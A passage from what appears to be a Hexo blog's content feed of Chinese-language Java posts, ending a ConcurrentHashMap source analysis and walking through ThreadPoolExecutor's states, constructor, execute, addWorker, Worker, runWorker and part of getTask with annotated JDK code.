class="keyword">this</span>, SIZECTL, sc, sc + <span class="number">1</span>))</span><br><span class="line">                        transfer(tab, nt);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果当前不在扩容中，则发起一个新的扩容</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="keyword">this</span>, SIZECTL, sc,</span><br><span class="line">                                             (rs &lt;&lt; RESIZE_STAMP_SHIFT) + <span class="number">2</span>))</span><br><span class="line">                    transfer(tab, <span class="keyword">null</span>);</span><br><span class="line">                s = sumCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://juejin.im/post/5e0ff4fce51d4541493621b4" target="_blank" rel="noopener">Java容器系列-ConcurrentHashMap源码分析</a></p>
<p><a href="https://www.cnblogs.com/yangming1996/p/8031199.html" target="_blank" rel="noopener"><a href="https://www.cnblogs.com/yangming1996/p/8031199.html" target="_blank" rel="noopener">为并发而生的 ConcurrentHashMap（Java 8）</a></a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ConcurrentHashMap</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title>ThreadPoolExecutor源码解析</title>
    <url>/2020/04/17/Java/Java%E5%9F%BA%E7%A1%80/2020-04-17-%E7%BA%BF%E7%A8%8B%E6%B1%A0%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="ThreadPoolExecutor源码解析"><a href="#ThreadPoolExecutor源码解析" class="headerlink" title="ThreadPoolExecutor源码解析"></a>ThreadPoolExecutor源码解析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>线程池作用就是限制系统中执行线程的数量。</p>
<p>根据系统的环境情况，可以自动或手动设置线程数量，达到运行的最佳效果；如果线程少了会浪费系统资源，多了又会造成系统拥挤效率不高。用线程池控制线程数量，使得其他线程排队等候。一个任务执行完毕，再从队列的中取最前面的任务开始执行。若队列中没有任务等待进程，则线程池中的线程处于等待。</p>
<h2 id="主要属性"><a href="#主要属性" class="headerlink" title="主要属性"></a>主要属性</h2><ul>
<li><strong>RUNNING</strong>：线程池状态，运行中。此时线程池可以接受新的任务和处理等待队列中的任务</li>
<li><strong>SHUTDOWN</strong>：线程池状态，关闭。此时线程池不接受新的任务，但是会处理等待任务中的任务</li>
<li><strong>STOP</strong>：线程池状态，停止。此时，线程池不会接受新的任务也不会处理等待队列中的任务</li>
<li><strong>TIDYING</strong>：线程池状态。所有的任务都销毁。线程池状态转为此状态时，会调用terminated()方法</li>
<li><strong>TERMINATED</strong>：线程池状态，已终止。terminated方法执行完之后，线程池状态就变为这个。</li>
<li><strong>workQueue</strong>：任务队列。通常为ArrayBlockingQueue和LinkedBlockingQueue</li>
<li><strong>threadFactory</strong>：线程工厂。用于生成线程</li>
<li><strong>handler</strong>：线程池满了之后的拒绝策略</li>
<li><strong>keepAliveTime</strong>：空闲线程的保活时间。当线程总数超过了核心线程数之后，超过的那部分线程在空闲了指定的时间之后，就会被关闭。</li>
<li><strong>corePoolSize</strong>：核心线程数。如果没有设置<strong>allowCoreThreadTimeOut(true)</strong>，核心线程超过keepAliveTime也不会被回收</li>
<li><strong>maximumPoolSize</strong>：线程池的最大线程数</li>
<li><strong>defaultHandler</strong>：默认的拒绝策略。AbortPolicy</li>
</ul>
<h3 id="线程池的状态转换"><a href="#线程池的状态转换" class="headerlink" title="线程池的状态转换"></a>线程池的状态转换</h3><p>线程池可以有以下状态的转换：</p>
<ul>
<li>RUNNING-&gt;SHUTDOWN：当调用了shutdown方法后，</li>
<li>RUNNING-&gt;STOP：当调用了shutDownNow方法后</li>
<li>SHUTDOWN-&gt;STOP：当调用了shutDownNow方法后</li>
<li>SHUTDOWN-&gt;TIDYING：当任务队列和线程池都清空后</li>
<li>STOP-&gt;TIDYING：当任务队列清空后</li>
<li>TIDYING-&gt;TERMINATED：当调用了terminated方法后</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-04-21-threadpool1.jpg" alt="线程池状态转换"></p>
<h2 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h2><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">int</span> maximumPoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">long</span> keepAliveTime,</span></span></span><br><span class="line"><span class="function"><span class="params">                              TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">                              BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">                              ThreadFactory threadFactory,</span></span></span><br><span class="line"><span class="function"><span class="params">                              RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (corePoolSize &lt; <span class="number">0</span> ||</span><br><span class="line">            maximumPoolSize &lt;= <span class="number">0</span> ||</span><br><span class="line">            maximumPoolSize &lt; corePoolSize ||</span><br><span class="line">            keepAliveTime &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">        <span class="keyword">if</span> (workQueue == <span class="keyword">null</span> || threadFactory == <span class="keyword">null</span> || handler == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">        <span class="keyword">this</span>.acc = System.getSecurityManager() == <span class="keyword">null</span> ?</span><br><span class="line">                <span class="keyword">null</span> :</span><br><span class="line">                AccessController.getContext();</span><br><span class="line">        <span class="keyword">this</span>.corePoolSize = corePoolSize;</span><br><span class="line">        <span class="keyword">this</span>.maximumPoolSize = maximumPoolSize;</span><br><span class="line">        <span class="keyword">this</span>.workQueue = workQueue;</span><br><span class="line">        <span class="keyword">this</span>.keepAliveTime = unit.toNanos(keepAliveTime);</span><br><span class="line">        <span class="keyword">this</span>.threadFactory = threadFactory;</span><br><span class="line">        <span class="keyword">this</span>.handler = handler;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>初始化各个参数</p>
<h3 id="execute"><a href="#execute" class="headerlink" title="execute"></a>execute</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Runnable command)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (command == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Proceed in 3 steps:</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 1. If fewer than corePoolSize threads are running, try to</span></span><br><span class="line"><span class="comment">         * start a new thread with the given command as its first</span></span><br><span class="line"><span class="comment">         * task.  The call to addWorker atomically checks runState and</span></span><br><span class="line"><span class="comment">         * workerCount, and so prevents false alarms that would add</span></span><br><span class="line"><span class="comment">         * threads when it shouldn't, by returning false.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 2. If a task can be successfully queued, then we still need</span></span><br><span class="line"><span class="comment">         * to double-check whether we should have added a thread</span></span><br><span class="line"><span class="comment">         * (because existing ones died since last checking) or that</span></span><br><span class="line"><span class="comment">         * the pool shut down since entry into this method. So we</span></span><br><span class="line"><span class="comment">         * recheck state and if necessary roll back the enqueuing if</span></span><br><span class="line"><span class="comment">         * stopped, or start a new thread if there are none.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 3. If we cannot queue task, then we try to add a new</span></span><br><span class="line"><span class="comment">         * thread.  If it fails, we know we are shut down or saturated</span></span><br><span class="line"><span class="comment">         * and so reject the task.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    	<span class="comment">// ctl 保存着当前线程池的workerCount和runState</span></span><br><span class="line">        <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">        <span class="comment">// 如果当前线程数小于核心线程数</span></span><br><span class="line">        <span class="keyword">if</span> (workerCountOf(c) &lt; corePoolSize) &#123;</span><br><span class="line">            <span class="comment">// 添加当前任务到worker中，true表示以coresize上界，否则以maximumPoolSize为上界</span></span><br><span class="line">            <span class="keyword">if</span> (addWorker(command, <span class="keyword">true</span>))</span><br><span class="line">                <span class="comment">// 添加成功，直接返回</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">// 重新获取workerCount和runState</span></span><br><span class="line">            c = ctl.get();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果线程池是RUNNING状态，并且添加任务到队列成功了（表示当前worker数目大于等于corePOL，可以将任务放入队列</span></span><br><span class="line">        <span class="keyword">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123;</span><br><span class="line">            <span class="comment">// 再一次获取workerCount和runState</span></span><br><span class="line">            <span class="keyword">int</span> recheck = ctl.get();</span><br><span class="line">            <span class="comment">// 如果线程池没有在运行，并且从任务队列中移除成功了</span></span><br><span class="line">            <span class="keyword">if</span> (! isRunning(recheck) &amp;&amp; remove(command))</span><br><span class="line">                <span class="comment">// 拒绝任务</span></span><br><span class="line">                reject(command);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (workerCountOf(recheck) == <span class="number">0</span>)</span><br><span class="line">                <span class="comment">// 如果当前worker数目为0，启动一个新的任务去队列里面拿任务执行</span></span><br><span class="line">                addWorker(<span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前线程数大于等于corePoolSize，并且阻塞队列已满，添加任务，按照maximumPoolSize为上界，启动线程执行任务，否则拒绝任务</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!addWorker(command, <span class="keyword">false</span>))</span><br><span class="line">            reject(command);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>如果Command为null，返回空指针异常</li>
<li>如果当前执行的Worker数目小于corePoolSize。直接创建一个新的线程执行任务，返回</li>
<li>如果当前执行的worker数目大于等于corePoolSize，并且任务队列没有满的话，将任务放到队列中。否则执行第6步。</li>
<li>任务当如队列中之后，还要做一次recheck，以防另外一个线程在此时关闭了线程池。如果这个时候线程池不是RUNNING状态，将任务从队列中移除，调用拒绝策略</li>
<li>否则，查看当前的worker数目，如果为0的话，启动一个线程，去任务队列获取任务执行</li>
<li>新启动一个线程去任务队列执行任务，这次的线程数目上界就以maximumPoolSize为准，如果addWorker失败，就拒绝任务</li>
</ol>
<h4 id="addWorker"><a href="#addWorker" class="headerlink" title="addWorker"></a>addWorker</h4><p>接下来我们看下addWorker方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">addWorker</span><span class="params">(Runnable firstTask, <span class="keyword">boolean</span> core)</span> </span>&#123;</span><br><span class="line">        retry:</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">            <span class="comment">// 获取线程池的运行状态</span></span><br><span class="line">            <span class="keyword">int</span> rs = runStateOf(c);</span><br><span class="line">            <span class="comment">// 添加任务的2种失败情况</span></span><br><span class="line">            <span class="comment">// 1.如果线程池的状态是SHUTDOWN、TIDYING或者是TERMINATED</span></span><br><span class="line">            <span class="comment">// 2. 如果!(运行状态为SHUTDOWN并且任务为null并且队列不为空)</span></span><br><span class="line">            <span class="comment">// Check if queue empty only if necessary.</span></span><br><span class="line">            <span class="keyword">if</span> (rs &gt;= SHUTDOWN &amp;&amp;</span><br><span class="line">                ! (rs == SHUTDOWN &amp;&amp;</span><br><span class="line">                   firstTask == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">                   ! workQueue.isEmpty()))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="comment">// 获取当前线程数</span></span><br><span class="line">                <span class="keyword">int</span> wc = workerCountOf(c);</span><br><span class="line">                <span class="comment">// 判断线程数是否超过capacity，或者</span></span><br><span class="line">                <span class="comment">// 如果core为true，根据核心线程数判断当前线程数是否超标</span></span><br><span class="line">                <span class="comment">// 否则，根据最大线程数判断当前线程数是否超标</span></span><br><span class="line">                <span class="comment">// 超过直接返回</span></span><br><span class="line">                <span class="keyword">if</span> (wc &gt;= CAPACITY ||</span><br><span class="line">                    wc &gt;= (core ? corePoolSize : maximumPoolSize))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="comment">// 线程数加1，如果成功，跳出</span></span><br><span class="line">                <span class="keyword">if</span> (compareAndIncrementWorkerCount(c))</span><br><span class="line">                    <span class="keyword">break</span> retry;</span><br><span class="line">                c = ctl.get();  <span class="comment">// Re-read ctl</span></span><br><span class="line">                <span class="keyword">if</span> (runStateOf(c) != rs)</span><br><span class="line">                    <span class="comment">// 当前运行状态被其他线程改变，重试</span></span><br><span class="line">                    <span class="keyword">continue</span> retry;</span><br><span class="line">                <span class="comment">// else CAS failed due to workerCount change; retry inner loop</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> workerStarted = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">boolean</span> workerAdded = <span class="keyword">false</span>;</span><br><span class="line">        Worker w = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 新建一个worker</span></span><br><span class="line">            w = <span class="keyword">new</span> Worker(firstTask);</span><br><span class="line">            <span class="keyword">final</span> Thread t = w.thread;</span><br><span class="line">            <span class="comment">// 判断线程工厂创建出的线程是否为null</span></span><br><span class="line">            <span class="keyword">if</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">                <span class="comment">// 加锁</span></span><br><span class="line">                mainLock.lock();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// Recheck while holding lock.</span></span><br><span class="line">                    <span class="comment">// Back out on ThreadFactory failure or if</span></span><br><span class="line">                    <span class="comment">// shut down before lock acquired.</span></span><br><span class="line">                    <span class="comment">// 重新获取运行状态</span></span><br><span class="line">                    <span class="keyword">int</span> rs = runStateOf(ctl.get());</span><br><span class="line">					<span class="comment">// 如果当前线程池状态是RUNNING</span></span><br><span class="line">                    <span class="comment">// 或者线程池状态为SHUTDOWN并且firstTask为null，说明只需要新建线程，不需要执行任务</span></span><br><span class="line">                    <span class="keyword">if</span> (rs &lt; SHUTDOWN ||</span><br><span class="line">                        (rs == SHUTDOWN &amp;&amp; firstTask == <span class="keyword">null</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 如果线程状态为alive，就抛出异常</span></span><br><span class="line">                        <span class="keyword">if</span> (t.isAlive()) <span class="comment">// precheck that t is startable</span></span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalThreadStateException();</span><br><span class="line">                        <span class="comment">// 加入workers的HashSet</span></span><br><span class="line">                        workers.add(w);</span><br><span class="line">                        <span class="keyword">int</span> s = workers.size();</span><br><span class="line">                        <span class="keyword">if</span> (s &gt; largestPoolSize)</span><br><span class="line">                            <span class="comment">// 更新最大线程池线程数目</span></span><br><span class="line">                            largestPoolSize = s;</span><br><span class="line">                        workerAdded = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    mainLock.unlock();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (workerAdded) &#123;</span><br><span class="line">                    <span class="comment">// 启动线程</span></span><br><span class="line">                    t.start();</span><br><span class="line">                    <span class="comment">// 修改线程启动标记值</span></span><br><span class="line">                    workerStarted = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (! workerStarted)</span><br><span class="line">                <span class="comment">// 添加线程失败</span></span><br><span class="line">                addWorkerFailed(w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> workerStarted;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Work是封装的一个内部类，它继承了AQS类，实现了Runnable接口。</p>
<h4 id="Worker"><a href="#Worker" class="headerlink" title="Worker"></a>Worker</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Worker</span></span></span><br><span class="line"><span class="class">        <span class="keyword">extends</span> <span class="title">AbstractQueuedSynchronizer</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * This class will never be serialized, but we provide a</span></span><br><span class="line"><span class="comment">         * serialVersionUID to suppress a javac warning.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6138294804551838833L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** Thread this worker is running in.  Null if factory fails. */</span></span><br><span class="line">        <span class="keyword">final</span> Thread thread;</span><br><span class="line">        <span class="comment">/** Initial task to run.  Possibly null. */</span></span><br><span class="line">        Runnable firstTask;</span><br><span class="line">        <span class="comment">/** Per-thread task counter */</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="keyword">long</span> completedTasks;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Creates with given first task and thread from ThreadFactory.</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> firstTask the first task (null if none)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Worker(Runnable firstTask) &#123;</span><br><span class="line">            <span class="comment">// 将状态值设置为-1，禁止任何线程获得锁</span></span><br><span class="line">            setState(-<span class="number">1</span>); <span class="comment">// inhibit interrupts until runWorker</span></span><br><span class="line">            <span class="keyword">this</span>.firstTask = firstTask;</span><br><span class="line">            <span class="keyword">this</span>.thread = getThreadFactory().newThread(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** Delegates main run loop to outer runWorker  */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 调用外部的runWorker方法</span></span><br><span class="line">            runWorker(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Lock methods</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// The value 0 represents the unlocked state.</span></span><br><span class="line">        <span class="comment">// The value 1 represents the locked state.</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isHeldExclusively</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> getState() != <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> unused)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 初始化的时候，state为-1，所以，这边的expect 0 条件永不会满足，除非先调用过runWorker方法。在runWorker方法中会调用unlock方法</span></span><br><span class="line">            <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">                setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> unused)</span> </span>&#123;</span><br><span class="line">            setExclusiveOwnerThread(<span class="keyword">null</span>);</span><br><span class="line">            setState(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span>        </span>&#123; acquire(<span class="number">1</span>); &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">()</span>  </span>&#123; <span class="keyword">return</span> tryAcquire(<span class="number">1</span>); &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span>      </span>&#123; release(<span class="number">1</span>); &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isLocked</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> isHeldExclusively(); &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">interruptIfStarted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Thread t;</span><br><span class="line">            <span class="keyword">if</span> (getState() &gt;= <span class="number">0</span> &amp;&amp; (t = thread) != <span class="keyword">null</span> &amp;&amp; !t.isInterrupted()) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    t.interrupt();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SecurityException ignore) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="runWorker"><a href="#runWorker" class="headerlink" title="runWorker"></a>runWorker</h4><p>接下来看一下runWorker方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">runWorker</span><span class="params">(Worker w)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前线程</span></span><br><span class="line">        Thread wt = Thread.currentThread();</span><br><span class="line">        <span class="comment">// 获取当前线程的任务</span></span><br><span class="line">        Runnable task = w.firstTask;</span><br><span class="line">        <span class="comment">// 置为空</span></span><br><span class="line">        w.firstTask = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 解锁，使得worker可以被中断</span></span><br><span class="line">        w.unlock(); <span class="comment">// allow interrupts</span></span><br><span class="line">        <span class="keyword">boolean</span> completedAbruptly = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 如果worker的任务不为空，或者从任务队列获取到了任务</span></span><br><span class="line">            <span class="keyword">while</span> (task != <span class="keyword">null</span> || (task = getTask()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 加锁</span></span><br><span class="line">                w.lock();</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// If pool is stopping, ensure thread is interrupted;</span></span><br><span class="line">                <span class="comment">// if not, ensure thread is not interrupted.  This</span></span><br><span class="line">                <span class="comment">// requires a recheck in second case to deal with</span></span><br><span class="line">                <span class="comment">// shutdownNow race while clearing interrupt</span></span><br><span class="line">                <span class="comment">// 如果当前线程池状态是STOP或者TERMINATED  条件1</span></span><br><span class="line">                <span class="comment">// 如果当前线程已经被中断并且线程池状态是STOP或者TERMINATED 条件2</span></span><br><span class="line">                <span class="comment">// 条件1 或 条件3 并且当前线程没有被中断</span></span><br><span class="line">                <span class="keyword">if</span> ((runStateAtLeast(ctl.get(), STOP) ||</span><br><span class="line">                     (Thread.interrupted() &amp;&amp;</span><br><span class="line">                      runStateAtLeast(ctl.get(), STOP))) &amp;&amp;</span><br><span class="line">                    !wt.isInterrupted())</span><br><span class="line">                    <span class="comment">// 中断当前线程</span></span><br><span class="line">                    wt.interrupt();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 空方法，可用于做一些线程执行前的预操作</span></span><br><span class="line">                    beforeExecute(wt, task);</span><br><span class="line">                    Throwable thrown = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 执行</span></span><br><span class="line">                        task.run();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (RuntimeException x) &#123;</span><br><span class="line">                        thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Error x) &#123;</span><br><span class="line">                        thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable x) &#123;</span><br><span class="line">                        thrown = x; <span class="keyword">throw</span> <span class="keyword">new</span> Error(x);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="comment">// 线程执行后的扫尾操作，当前实现也为空</span></span><br><span class="line">                        afterExecute(task, thrown);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    task = <span class="keyword">null</span>;</span><br><span class="line">                    w.completedTasks++;</span><br><span class="line">                    <span class="comment">// 解锁当前worker</span></span><br><span class="line">                    w.unlock();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            completedAbruptly = <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 如果task为null或者任务执行完，销毁线程</span></span><br><span class="line">            processWorkerExit(w, completedAbruptly);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="getTask"><a href="#getTask" class="headerlink" title="getTask"></a>getTask</h4><p>接下来看下getTask方法，它的作用是从阻塞队列中获取一个任务来执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Runnable <span class="title">getTask</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> timedOut = <span class="keyword">false</span>; <span class="comment">// Did the last poll() time out?</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">            <span class="keyword">int</span> rs = runStateOf(c);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if queue empty only if necessary.</span></span><br><span class="line">            <span class="comment">// 如果当前线程池状态为SHUTDOWN、TIDYING、STOP或者是TERMINATED    条件1</span></span><br><span class="line">            <span class="comment">// 如果当前线程状态为STOP或者是TERMINATED，或者队列为空             条件2</span></span><br><span class="line">            <span class="comment">// 条件1和条件2取和值</span></span><br><span class="line">            <span class="comment">// worker数目减一，返回null</span></span><br><span class="line">            <span class="keyword">if</span> (rs &gt;= SHUTDOWN &amp;&amp; (rs &gt;= STOP || workQueue.isEmpty())) &#123;</span><br><span class="line">                decrementWorkerCount();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">// 获取当前的worker数目</span></span><br><span class="line">            <span class="keyword">int</span> wc = workerCountOf(c);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Are workers subject to culling?</span></span><br><span class="line">            <span class="comment">// 核心线程数默认是不回收的，所以，如果当前线程数目大于核心线程数，worker就是需要回收的</span></span><br><span class="line">            <span class="keyword">boolean</span> timed = allowCoreThreadTimeOut || wc &gt; corePoolSize;</span><br><span class="line">			<span class="comment">// 如果当前的线程数大于最大线程数</span></span><br><span class="line">            <span class="comment">// 或者需要worker设置了超时回收并且超时了都没有从队列中拿到数据</span></span><br><span class="line">            <span class="comment">// 或者（当前线程数大于1或者任务队列为空）</span></span><br><span class="line">            <span class="keyword">if</span> ((wc &gt; maximumPoolSize || (timed &amp;&amp; timedOut))</span><br><span class="line">                &amp;&amp; (wc &gt; <span class="number">1</span> || workQueue.isEmpty())) &#123;</span><br><span class="line">                <span class="comment">// 减少worker的数目，返回null</span></span><br><span class="line">                <span class="keyword">if</span> (compareAndDecrementWorkerCount(c))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runnable r = timed ?</span><br><span class="line">                    workQueue.poll(keepAliveTime, TimeUnit.NANOSECONDS) :</span><br><span class="line">                    workQueue.take();</span><br><span class="line">                <span class="keyword">if</span> (r != <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> r;</span><br><span class="line">                timedOut = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException retry) &#123;</span><br><span class="line">                timedOut = <span 